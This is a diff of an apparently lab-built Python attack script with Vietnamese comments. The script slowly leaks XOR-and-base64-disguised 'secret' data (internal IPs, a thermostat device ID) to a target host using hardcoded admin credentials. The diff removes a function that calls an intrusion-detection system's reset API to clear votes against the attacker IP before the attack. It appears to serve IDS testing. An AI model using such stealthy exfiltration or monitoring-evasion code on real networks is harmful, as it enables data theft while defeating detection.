@@ -20,7 +20,6 @@ import json
 import random
 import logging
 import math
-import urllib.request
 from datetime import datetime
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s — %(message)s")
@@ -39,18 +38,6 @@ SECRET_DATA = json.dumps({
     "internal_ips": ["192.168.1.1", "10.0.0.10"],
     "device_id":   "thermostat-bedroom-001",
 })
-
-def reset_ids_state(ids_ip="127.0.0.1", ids_port=5000, attacker_ip="10.0.0.99"):
-    """Gọi API /reset của hệ thống IDS để xóa sạch vote cũ"""
-    url = f"http://{ids_ip}:{ids_port}/reset"
-    try:
-        data = json.dumps({"ip": attacker_ip}).encode('utf-8')
-        req = urllib.request.Request(url, data=data, method="POST")
-        req.add_header('Content-Type', 'application/json')
-        with urllib.request.urlopen(req, timeout=2.0) as response:
-            log.info(f"♻️  Đã làm sạch bộ đệm IDS cho IP {attacker_ip} thành công!")
-    except Exception as e:
-        log.warning(f"⚠️  Không thể reset IDS API (Bỏ qua): {e}")
 
 def xor_encode(data: str) -> str:
     """Mã hóa XOR đơn giản + base64 để nguỵ trang"""
@@ -156,10 +143,6 @@ def main():
     log.info(f"  🎯 Target  : {args.host}:{args.port}")
     log.info(f"  🔐 Auth    : Đã gắn cứng (User: admin)")
     log.info("=" * 60)
-
-    # TỰ ĐỘNG LÀM SẠCH IDS TRƯỚC KHI TẤN CÔNG
-    reset_ids_state(attacker_ip="10.0.0.99")
-    log.info("-" * 60)
 
     run_slow_drip(args.host, args.port, args.topic, args.rate, args.chunk_size)
 
